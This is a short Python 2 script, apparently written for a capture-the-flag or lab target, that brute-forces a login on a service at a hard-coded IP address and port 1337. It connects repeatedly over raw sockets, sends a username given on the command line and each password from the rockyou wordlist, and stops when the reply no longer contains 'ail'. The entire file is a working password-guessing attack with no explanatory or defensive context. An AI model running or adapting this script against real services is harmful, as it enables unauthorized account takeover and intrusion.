from socket import socket
import gzip
from sys import argv

host = '142.93.117.193'
port = 1337
user = argv[1]
for word in gzip.open('/usr/share/wordlists/rockyou.txt.gz','rb'):
    word = word.strip()
    s = socket()
    s.connect((host, port))
    s.recv(1024)
    s.send(user + '\n')
    s.recv(1024)
    s.send(word + '\n')

    result = s.recv(1024)
    if 'ail' not in result:
        print 'the word is: ' + word
        exit()

    print (word, result)

    s.close()
